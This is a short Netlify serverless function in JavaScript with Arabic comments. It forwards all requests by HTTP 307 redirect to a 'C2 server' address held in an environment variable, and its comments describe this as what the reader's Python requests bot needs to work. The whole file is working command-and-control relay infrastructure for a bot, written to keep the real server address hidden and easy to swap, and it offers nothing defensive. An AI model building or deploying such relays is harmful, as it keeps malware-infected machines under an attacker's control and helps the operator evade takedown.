// exports.handler هي الصيغة القياسية لدوال Netlify
exports.handler = async function(event, context) {
  
  // 1. احصل على عنوان السيرفر الفعال من "متغيرات البيئة" في Netlify
  // هذا هو بديلك لملف "server_url.txt". وهو آمن ومخزن في إعدادات Netlify.
  const activeServerUrl = process.env.ACTIVE_SERVER_URL;

  // 2. إذا لم يقم الأدمن بضبط الرابط، أرجع رسالة خطأ
  if (!activeServerUrl) {
    return {
      statusCode: 503, // Service Unavailable (الخدمة غير متوفرة)
      body: JSON.stringify({ error: "Active C2 server is not configured." })
    };
  }

  // 3. قم بإعادة توجيه (HTTP 307 Redirect) لكل الطلبات
  // الـ 307 Temporary Redirect هو الأفضل لأنه يحافظ على نوع الطلب الأصلي (POST, GET) والبيانات المرسلة.
  // وهذا هو بالضبط ما يحتاجه بوت python requests الخاص بك ليعمل بشكل صحيح.
  return {
    statusCode: 307,
    headers: {
      "Location": activeServerUrl,
    },
  };
};
